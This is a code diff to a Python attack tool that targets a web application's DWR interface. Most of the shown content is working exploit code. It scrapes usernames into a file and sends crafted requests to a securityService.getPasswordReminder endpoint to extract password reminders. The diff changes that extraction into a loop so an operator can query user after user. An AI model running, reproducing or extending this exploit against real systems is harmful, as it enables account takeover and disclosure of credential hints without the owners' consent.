@@ -101,7 +101,7 @@ class Cofe:
                 try:
                     r = requests.get(requestUrl, headers={"User-Agent":self.agent}, verify=False, timeout=5)
                     if "200" in str(r) and not "404" in r.text:
-                        print("[+] Found DWR SCRIPTS: {}".format(self.url+line))
+                        print("[+] Found DWR SCRIPTS: {}".format(self.url+line.rstrip()))
                 except Exception as e:
                     print(e)
                     print(warning("[-] Timeout reached ! / maybe a WAF dropping malicious requests.. \n"))
@@ -127,9 +127,10 @@ class Cofe:
             for m in re.findall(r'name="(\w*)"', r.text):
                 print("[+] Possible user: {}".format(str(m)))
                 f.write(m+"\n")
+            f.close() 
         print(notice("[+] Finish all possible logins were got.. \n"))
         print(notice("[+] created a file.. ( user-file.txt ) with all users collected \n"))
-        f.close()    
+           
 
 
     """  send exploit to get EMAILS and save on a file  """
@@ -153,13 +154,17 @@ class Cofe:
         "c0-scriptName":"securityService","c0-methodName":"getPasswordReminder","c0-id":"0","c0-param0":"string:admin","batchId":'2'}
         r = requests.post(self.url + "dwr-view/call/plaincall/securityService.getPasswordReminder.dwr", data=exploit, verify=False)
         if "200" in str(r) and not "404" in r.text:
-            remainderUser = input("[+] Type the user to get ther password Remainder:  ").lower()
-            xpltUser = {"callCount":1,"page":"/dwr-view/test/securityService","httpSessionId":"CDB3084D13EEC28BED7EAC3CE49F902C","scriptSessionId":"5EE540BF8C30DE30ACD6E0045EC3D44C464",
-            "c0-scriptName":"securityService","c0-methodName":"getPasswordReminder","c0-id":"0","c0-param0":"string:"+remainderUser,"batchId":'2'}
-            r2 = requests.post(self.url + "dwr-view/call/plaincall/securityService.getPasswordReminder.dwr", headers={'User-Agent':self.agent}, data=xpltUser, verify=False)
-            if "200" in str(2) and not "404" in r.text:
-                print(r2.text)
 
+            while True:
+                remainderUser = input("[+] Type the user to get ther password Remainder or (type [q] to quit):  ").lower()
+                if remainderUser[0].lower() == 'q':
+                    break
+                else:
+                    xpltUser = {"callCount":1,"page":"/dwr-view/test/securityService","httpSessionId":"CDB3084D13EEC28BED7EAC3CE49F902C","scriptSessionId":"5EE540BF8C30DE30ACD6E0045EC3D44C464",
+                    "c0-scriptName":"securityService","c0-methodName":"getPasswordReminder","c0-id":"0","c0-param0":"string:"+remainderUser,"batchId":'2'}
+                    r2 = requests.post(self.url + "dwr-view/call/plaincall/securityService.getPasswordReminder.dwr", headers={'User-Agent':self.agent}, data=xpltUser, verify=False)
+                    print(r2.text)
+            
 
     
 
